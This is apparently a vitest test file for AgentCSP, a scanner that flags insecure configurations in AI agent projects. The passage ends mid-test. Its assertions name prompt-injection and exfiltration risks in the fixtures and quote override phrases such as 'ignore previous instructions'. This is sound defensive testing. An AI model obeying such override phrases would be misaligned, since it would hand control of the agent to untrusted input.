import { describe, expect, it } from "vitest";
import fs from "node:fs/promises";
import path from "node:path";
import { detectSurfaces } from "../src/scanner/detect.js";
import { walkProject } from "../src/scanner/walk.js";
import { loadRules, runRules } from "../src/rules/engine.js";
import { scanProject } from "../src/scanner/scan.js";

describe("rule engine", () => {
  it("runs built-in YAML rules over normalized manifest objects", async () => {
    const fixtureRoot = path.resolve("examples/vulnerable-agent");
    const files = await walkProject({
      root_path: fixtureRoot,
      output_path: ".agentcsp",
      formats: ["json", "md"],
      include_hidden: true,
      include_logs: false,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });
    const surfaces = await detectSurfaces(files);
    const rules = await loadRules(path.resolve("rules"));
    const findings = runRules(surfaces, rules);

    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-007")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-008")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-009")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-010")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-011")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-007")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-008")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-009")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-010")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-011")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-012")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-013")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-014")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-015")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-CICD-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-CURSOR-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-INSTRUCTION-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-SKILL-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-003")).toBe(true);
    expect(findings.some((finding) => finding.severity === "critical")).toBe(true);
    expect(findings.some((finding) => finding.confidence === "very_high")).toBe(true);
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-RUNTIME-001")?.confidence).toBe("very_high");
    const runtimeMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-003");
    expect(runtimeMcpFindings.map((finding) => finding.matched_object.path).sort()).toEqual([
      ".claude/settings.json",
      ".codex/config.toml"
    ]);
    expect(runtimeMcpFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    const runtimeAutoApprovedFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-004");
    expect(runtimeAutoApprovedFindings).toHaveLength(1);
    expect(runtimeAutoApprovedFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeAutoApprovedFindings[0]?.matched_object.metadata.permission_allowlist).toEqual(
      expect.arrayContaining(["Bash", "WebFetch", "mcp:filesystem-admin"])
    );
    expect(runtimeAutoApprovedFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeAutoApprovedFindings[0])).not.toContain("npm run deploy");
    expect(JSON.stringify(runtimeAutoApprovedFindings[0])).not.toContain("${ANTHROPIC_API_KEY}");
    const runtimeAutoApprovedReleaseFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-005");
    expect(runtimeAutoApprovedReleaseFindings).toHaveLength(1);
    expect(runtimeAutoApprovedReleaseFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeAutoApprovedReleaseFindings[0]?.matched_object.metadata.referenced_release_package_scripts).toEqual([
      "package-script:deploy"
    ]);
    expect(runtimeAutoApprovedReleaseFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeAutoApprovedReleaseFindings[0])).not.toContain("npm run deploy");
    const runtimeDestructiveMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-006");
    expect(runtimeDestructiveMcpFindings).toHaveLength(1);
    expect(runtimeDestructiveMcpFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeDestructiveMcpFindings[0]?.matched_object.metadata.auto_approved_destructive_mcp_tool_refs).toEqual([
      "mcp:filesystem_admin/delete_file"
    ]);
    expect(runtimeDestructiveMcpFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeDestructiveMcpFindings[0])).not.toContain("mcp__filesystem-admin__delete_file");
    const runtimeBroadWebFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-007");
    expect(runtimeBroadWebFindings).toHaveLength(1);
    expect(runtimeBroadWebFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeBroadWebFindings[0]?.matched_object.metadata.auto_approved_network_tools).toEqual(["WebFetch"]);
    expect(runtimeBroadWebFindings[0]?.matched_object.metadata.auto_approved_network_scope_kinds).toEqual([
      "wildcard_domain"
    ]);
    expect(runtimeBroadWebFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeBroadWebFindings[0])).not.toContain("domain:*");
    const runtimeTelemetryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-008");
    expect(runtimeTelemetryFindings).toHaveLength(1);
    expect(runtimeTelemetryFindings[0]?.matched_object.path).toBe("observability/agent-tracing.yaml");
    expect(runtimeTelemetryFindings[0]?.matched_object.metadata).toMatchObject({
      ai_telemetry_provider: "langsmith",
      ai_telemetry_remote_export: true,
      ai_telemetry_sensitive_capture: true,
      ai_telemetry_redaction_disabled: true
    });
    expect(runtimeTelemetryFindings[0]?.severity).toBe("critical");
    expect(runtimeTelemetryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeTelemetryFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeTelemetryFindings[0])).not.toContain("${LANGSMITH_API_KEY}");
    expect(JSON.stringify(runtimeTelemetryFindings[0])).not.toContain("api.smith.langchain.com");
    const runtimeModelEndpointFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-009");
    expect(runtimeModelEndpointFindings).toHaveLength(1);
    expect(runtimeModelEndpointFindings[0]?.matched_object.path).toBe("models/model-gateway.yaml");
    expect(runtimeModelEndpointFindings[0]?.matched_object.metadata).toMatchObject({
      ai_model_provider: "openai_compatible",
      ai_model_remote_endpoint: true,
      ai_model_plaintext_endpoint: true,
      ai_model_sensitive_context: true,
      ai_model_sends_tool_outputs: true,
      ai_model_sends_retrieval_context: true,
      ai_model_sends_memory: true
    });
    expect(runtimeModelEndpointFindings[0]?.severity).toBe("critical");
    expect(runtimeModelEndpointFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelEndpointFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeModelEndpointFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeModelEndpointFindings[0])).not.toContain("llm-gateway.example.invalid");
    expect(JSON.stringify(runtimeModelEndpointFindings[0])).not.toContain("agentcsp-support-ops");
    const runtimeDatabaseFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-010");
    expect(runtimeDatabaseFindings).toHaveLength(1);
    expect(runtimeDatabaseFindings[0]?.matched_object.path).toBe("database/support-db.yaml");
    expect(runtimeDatabaseFindings[0]?.matched_object.metadata).toMatchObject({
      database_provider: "postgres",
      database_remote: true,
      database_write_enabled: true,
      database_delete_enabled: true,
      database_query_execution_enabled: true,
      database_untrusted_query_input: true,
      database_sensitive_data: true,
      database_pii_data: true
    });
    expect(runtimeDatabaseFindings[0]?.severity).toBe("critical");
    expect(runtimeDatabaseFindings[0]?.confidence).toBe("very_high");
    expect(runtimeDatabaseFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("${SUPPORT_DB_URL}");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("${SUPPORT_DB_PASSWORD}");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("support-db.example.invalid");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("customer_profiles");
    const runtimeBrowserSessionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-011");
    expect(runtimeBrowserSessionFindings).toHaveLength(1);
    expect(runtimeBrowserSessionFindings[0]?.matched_object.path).toBe("browser/session.yaml");
    expect(runtimeBrowserSessionFindings[0]?.matched_object.metadata).toMatchObject({
      browser_provider: "playwright",
      browser_authenticated_session: true,
      browser_untrusted_navigation: true,
      browser_click_or_form_authority: true,
      browser_broad_origin_access: true,
      browser_path_references_redacted: true
    });
    expect(runtimeBrowserSessionFindings[0]?.severity).toBe("critical");
    expect(runtimeBrowserSessionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeBrowserSessionFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain("${BROWSER_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain(".browser/support-profile");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain(".auth/support-browser-state.json");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain("support.example.invalid");
    const runtimeSaasConnectorFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-012");
    expect(runtimeSaasConnectorFindings).toHaveLength(1);
    expect(runtimeSaasConnectorFindings[0]?.matched_object.path).toBe("connectors/slack-customer-success.yaml");
    expect(runtimeSaasConnectorFindings[0]?.matched_object.metadata).toMatchObject({
      saas_connector_provider: "slack",
      saas_connector_external_write_enabled: true,
      saas_connector_broad_scope: true,
      saas_connector_untrusted_input: true,
      saas_connector_approval_required: false
    });
    expect(runtimeSaasConnectorFindings[0]?.matched_object.metadata.saas_connector_scope_categories).toEqual([
      "messaging_read",
      "messaging_write",
      "read_scope"
    ]);
    expect(runtimeSaasConnectorFindings[0]?.severity).toBe("critical");
    expect(runtimeSaasConnectorFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSaasConnectorFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("${CUSTOMER_SUCCESS_SLACK_BOT_TOKEN}");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("hooks.slack.example.invalid");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("chat:write");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("#customer-escalations");
    const runtimeSecretManagerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-013");
    expect(runtimeSecretManagerFindings).toHaveLength(1);
    expect(runtimeSecretManagerFindings[0]?.matched_object.path).toBe("secrets/vault-agent.yaml");
    expect(runtimeSecretManagerFindings[0]?.matched_object.metadata).toMatchObject({
      secret_manager_provider: "hashicorp_vault",
      secret_manager_read_enabled: true,
      secret_manager_broad_scope: true,
      secret_manager_injects_into_tools: true,
      secret_manager_untrusted_input: true,
      secret_manager_approval_required: false
    });
    expect(runtimeSecretManagerFindings[0]?.matched_object.metadata.secret_manager_scope_categories).toEqual([
      "secret_list",
      "secret_read",
      "sensitive_secret_scope"
    ]);
    expect(runtimeSecretManagerFindings[0]?.severity).toBe("critical");
    expect(runtimeSecretManagerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSecretManagerFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("${VAULT_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("vault.example.invalid");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("secret/data/prod/customer-support");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("prod-support-read");
    const runtimeInboundTriggerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-014");
    expect(runtimeInboundTriggerFindings).toHaveLength(1);
    expect(runtimeInboundTriggerFindings[0]?.matched_object.path).toBe("inbox/support-triage.yaml");
    expect(runtimeInboundTriggerFindings[0]?.matched_object.metadata).toMatchObject({
      inbound_trigger_provider: "gmail",
      inbound_trigger_external_source: true,
      inbound_trigger_invokes_agent: true,
      inbound_trigger_invokes_tools: true,
      inbound_trigger_write_authority: true,
      inbound_trigger_external_response: true,
      inbound_trigger_memory_write: true,
      inbound_trigger_approval_required: false
    });
    expect(runtimeInboundTriggerFindings[0]?.matched_object.metadata.inbound_trigger_source_categories).toEqual([
      "chat_message",
      "email_message",
      "ticket_comment",
      "webhook_payload"
    ]);
    expect(runtimeInboundTriggerFindings[0]?.matched_object.metadata.inbound_trigger_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "state_write",
      "tool_call"
    ]);
    expect(runtimeInboundTriggerFindings[0]?.severity).toBe("critical");
    expect(runtimeInboundTriggerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeInboundTriggerFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("${SUPPORT_INBOX_TOKEN}");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("mail-router.example.invalid");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("secops-support@example.invalid");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("support-triage-agent");
    const runtimeAgentOrchestrationFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-015");
    expect(runtimeAgentOrchestrationFindings).toHaveLength(1);
    expect(runtimeAgentOrchestrationFindings[0]?.matched_object.path).toBe("agents/support-crew.yaml");
    expect(runtimeAgentOrchestrationFindings[0]?.matched_object.metadata).toMatchObject({
      agent_orchestration_framework: "crewai",
      agent_orchestration_multi_agent: true,
      agent_orchestration_agent_count: 2,
      agent_orchestration_delegation_enabled: true,
      agent_orchestration_untrusted_input: true,
      agent_orchestration_shared_memory: true,
      agent_orchestration_invokes_tools: true,
      agent_orchestration_privileged_agent: true,
      agent_orchestration_write_authority: true,
      agent_orchestration_external_authority: true,
      agent_orchestration_secret_authority: true,
      agent_orchestration_approval_required: false
    });
    expect(runtimeAgentOrchestrationFindings[0]?.matched_object.metadata.agent_orchestration_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "repo_or_filesystem_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAgentOrchestrationFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentOrchestrationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentOrchestrationFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("${CREW_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("support-escalation-crew");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("production-support-memory");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("operations-executor");
    const automationAgentFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-002");
    expect(automationAgentFindings).toHaveLength(1);
    expect(automationAgentFindings[0]?.matched_object.path).toBe(".github/workflows/agent-maintenance.yml");
    expect(automationAgentFindings[0]?.confidence).toBe("very_high");
    const automationUntrustedEventFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-003");
    expect(automationUntrustedEventFindings).toHaveLength(1);
    expect(automationUntrustedEventFindings[0]?.matched_object.path).toBe(".github/workflows/agent-maintenance.yml");
    expect(automationUntrustedEventFindings[0]?.matched_object.metadata).toMatchObject({
      untrusted_event_trigger: true,
      untrusted_event_payload_used: true,
      untrusted_event_agent_input: true,
      agent_package_script_bridge: true,
      write_permissions: true,
      mentions_secrets_context: true
    });
    expect(automationUntrustedEventFindings[0]?.matched_object.metadata.untrusted_event_triggers).toEqual([
      "issue_comment",
      "pull_request",
      "repository_dispatch"
    ]);
    expect(automationUntrustedEventFindings[0]?.matched_object.metadata.untrusted_event_payload_sources).toEqual([
      "issue_comment_body",
      "pull_request_text",
      "repository_dispatch_payload"
    ]);
    expect(automationUntrustedEventFindings[0]?.severity).toBe("critical");
    expect(automationUntrustedEventFindings[0]?.confidence).toBe("very_high");
    expect(automationUntrustedEventFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(automationUntrustedEventFindings[0])).not.toContain("github.event.comment.body");
    expect(JSON.stringify(automationUntrustedEventFindings[0])).not.toContain("github.event.client_payload.prompt");
    expect(JSON.stringify(automationUntrustedEventFindings[0])).not.toContain("github.event.pull_request.body");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-MCP-004")?.matched_object.name).toBe(
      "ticketing-package-runner"
    );
    const opaqueMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-005");
    expect(opaqueMcpFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "browser-publisher",
      "filesystem-admin"
    ]);
    const plaintextMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-006");
    expect(plaintextMcpFindings).toHaveLength(1);
    expect(plaintextMcpFindings[0]?.matched_object.name).toBe("remote-ticketing");
    expect(plaintextMcpFindings[0]?.matched_object.metadata).toMatchObject({
      remote: true,
      remote_scheme: "http",
      plaintext_remote_transport: true,
      auth_header_names: ["Authorization"],
      secret_ref_key_names: ["TICKETING_MCP_TOKEN"]
    });
    expect(plaintextMcpFindings[0]?.severity).toBe("critical");
    expect(plaintextMcpFindings[0]?.confidence).toBe("very_high");
    expect(plaintextMcpFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(plaintextMcpFindings[0])).not.toContain("http://mcp.example.invalid/sse");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-PROMPT-001")?.matched_object.path).toBe(
      "prompts/support-ticket.prompt.md"
    );
    const promptMemoryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-PROMPT-002");
    expect(promptMemoryFindings).toHaveLength(1);
    expect(promptMemoryFindings[0]?.matched_object.path).toBe("prompts/memory-ingest.prompt.md");
    const promptExplicitToolFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-PROMPT-003");
    expect(promptExplicitToolFindings).toHaveLength(1);
    expect(promptExplicitToolFindings[0]?.matched_object.path).toBe("prompts/support-ticket.prompt.md");
    expect(promptExplicitToolFindings[0]?.matched_object.metadata.referenced_privileged_tools).toEqual(["publish_summary"]);
    expect(promptExplicitToolFindings[0]?.confidence).toBe("very_high");
    const promptRoleBoundaryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-PROMPT-004");
    expect(promptRoleBoundaryFindings).toHaveLength(1);
    expect(promptRoleBoundaryFindings[0]?.matched_object.path).toBe("prompts/support-ticket.prompt.md");
    expect(promptRoleBoundaryFindings[0]?.matched_object.metadata).toMatchObject({
      privileged_prompt_role: true,
      privileged_role_untrusted_template_input: true,
      privileged_role_untrusted_variable_count: 2
    });
    expect(promptRoleBoundaryFindings[0]?.matched_object.metadata.privileged_template_roles).toEqual([
      "developer",
      "system"
    ]);
    expect(promptRoleBoundaryFindings[0]?.severity).toBe("critical");
    expect(promptRoleBoundaryFindings[0]?.confidence).toBe("very_high");
    expect(promptRoleBoundaryFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(promptRoleBoundaryFindings[0])).not.toContain("customer note");
    const ragEgressFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RAG-003");
    expect(ragEgressFindings).toHaveLength(1);
    expect(ragEgressFindings[0]?.matched_object.path).toBe("rag/customer-note.md");
    expect(ragEgressFindings[0]?.data_classes).toContain("confidential");
    expect(ragEgressFindings[0]?.confidence).toBe("very_high");
    const ragVectorFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RAG-004");
    expect(ragVectorFindings).toHaveLength(1);
    expect(ragVectorFindings[0]?.matched_object.path).toBe("rag/vector-store.yaml");
    expect(ragVectorFindings[0]?.matched_object.metadata).toMatchObject({
      vector_store_provider: "pinecone",
      vector_store_remote: true,
      vector_store_write_enabled: true,
      vector_store_sync_enabled: true,
      vector_store_ingests_untrusted_sources: true
    });
    expect(ragVectorFindings[0]?.severity).toBe("critical");
    expect(ragVectorFindings[0]?.confidence).toBe("very_high");
    expect(ragVectorFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(ragVectorFindings[0])).not.toContain("${PINECONE_API_KEY}");
    expect(JSON.stringify(ragVectorFindings[0])).not.toContain("agentcsp-demo-vector.example.invalid");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-SKILL-001")?.matched_object.path).toBe(
      "skills/exfil-skill/SKILL.md"
    );
    const memoryExplicitToolFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MEMORY-003");
    expect(memoryExplicitToolFindings).toHaveLength(1);
    expect(memoryExplicitToolFindings[0]?.matched_object.path).toBe("memory/release-notes.md");
    expect(memoryExplicitToolFindings[0]?.matched_object.metadata.referenced_privileged_tools).toEqual(["publish_summary"]);
    expect(memoryExplicitToolFindings[0]?.recommended_control).toBe("quarantine");
    const instructionBridgeFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-INSTRUCTION-001");
    expect(instructionBridgeFindings).toHaveLength(1);
    expect(instructionBridgeFindings[0]?.matched_object.path).toBe("AGENTS.md");
    expect(instructionBridgeFindings[0]?.confidence_rationale).toContain("redacted content signals analyzed");
    const cursorRuleFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-CURSOR-001");
    expect(cursorRuleFindings).toHaveLength(1);
    expect(cursorRuleFindings[0]?.matched_object.path).toBe(".cursor/rules/customer-escalation.mdc");
    expect(cursorRuleFindings[0]?.matched_object.metadata).toMatchObject({
      cursor_rule: true,
      cursor_rule_always_apply: true,
      cursor_rule_applies_broadly: true,
      context_bridge_privileged: true
    });
    expect(cursorRuleFindings[0]?.severity).toBe("critical");
    expect(cursorRuleFindings[0]?.confidence).toBe("very_high");
    expect(cursorRuleFindings[0]?.confidence_rationale).toContain("redacted content signals analyzed");
    expect(JSON.stringify(cursorRuleFindings[0])).not.toContain("When a customer escalation arrives");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-TOOL-005")?.matched_object.name).toBe(
      "post_customer_update"
    );
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-TOOL-006")?.matched_object.name).toBe(
      "readonly_cleanup_workspace"
    );
    const toolPathExfilFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-008");
    expect(toolPathExfilFindings).toHaveLength(1);
    expect(toolPathExfilFindings[0]?.matched_object.name).toBe("customer_record");
    const toolContentExternalFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-009");
    expect(toolContentExternalFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "post_customer_update",
      "publish_summary"
    ]);
    expect(toolContentExternalFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    const toolPiiExternalFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-010");
    expect(toolPiiExternalFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "customer_record",
      "post_customer_update"
    ]);
    expect(toolPiiExternalFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    expect(toolPiiExternalFindings.every((finding) => finding.data_classes.includes("pii"))).toBe(true);
    const toolDescriptionInjectionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-011");
    expect(toolDescriptionInjectionFindings).toHaveLength(1);
    expect(toolDescriptionInjectionFindings[0]?.matched_object.name).toBe("publish_summary");
    expect(toolDescriptionInjectionFindings[0]?.matched_object.metadata).toMatchObject({
      model_visible_description_instruction_override: true,
      model_visible_description_context_bridge_privileged: true,
      external_write: true
    });
    expect(toolDescriptionInjectionFindings[0]?.severity).toBe("critical");
    expect(toolDescriptionInjectionFindings[0]?.confidence).toBe("very_high");
    expect(toolDescriptionInjectionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(toolDescriptionInjectionFindings[0])).not.toContain("ignore previous instructions");
    const toolShadowFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-007");
    expect(toolShadowFindings.map((finding) => finding.matched_object.path).sort()).toEqual([
      "tools/agent-tools.json",
      "tools/shadow-tools.json"
    ]);
    expect(findings.every((finding) => finding.confidence_rationale.length > 0)).toBe(true);
    expect(findings.every((finding) => finding.evidence.every((item) => item.redacted))).toBe(true);
  });

  it("keeps the safe read-only fixture free of high and critical findings", async () => {
    const fixtureRoot = path.resolve("examples/safe-agent");
    const files = await walkProject({
      root_path: fixtureRoot,
      output_path: ".agentcsp",
      formats: ["json", "md"],
      include_hidden: true,
      include_logs: false,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });
    const surfaces = await detectSurfaces(files);
    const rules = await loadRules(path.resolve("rules"));
    const findings = runRules(surfaces, rules);

    expect(findings.filter((finding) => finding.severity === "critical" || finding.severity === "high")).toHaveLength(0);
  });

  it("flags generated agent state replay risk when logs are explicitly included", async () => {
    const fixtureRoot = path.resolve("examples/vulnerable-agent");
    const files = await walkProject({
      root_path: fixtureRoot,
      output_path: ".agentcsp",
      formats: ["json", "md"],
      include_hidden: true,
      include_logs: true,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });
    const surfaces = await detectSurfaces(files);
    const rules = await loadRules(path.resolve("rules"));
    const findings = runRules(surfaces, rules);
    const generatedStateFinding = findings.find((finding) => finding.rule_id === "AGENTCSP-GENSTATE-001");

    expect(generatedStateFinding).toBeDefined();
    expect(generatedStateFinding?.matched_object.path).toBe("logs/session-transcript.txt");
    expect(generatedStateFinding?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(generatedStateFinding)).not.toContain("Ignore previous repository instructions");
  });

  it("keeps built-in rules active when a scanned repo has local rules", async () => {
    const fixtureRoot = await createLocalRulesFixture();
    const result = await scanProject({
      root_path: fixtureRoot,
      output_path: "/private/tmp/agentcsp-local-rules-output",
      formats: ["json", "md", "sarif"],
      include_hidden: true,
      include_logs: false,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });

    const networkToShellFindings = result.findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-002");
    expect(networkToShellFindings).toHaveLength(1);
    expect(networkToShellFindings[0]?.matched_object.name).toBe("package-script:agent:bootstrap");
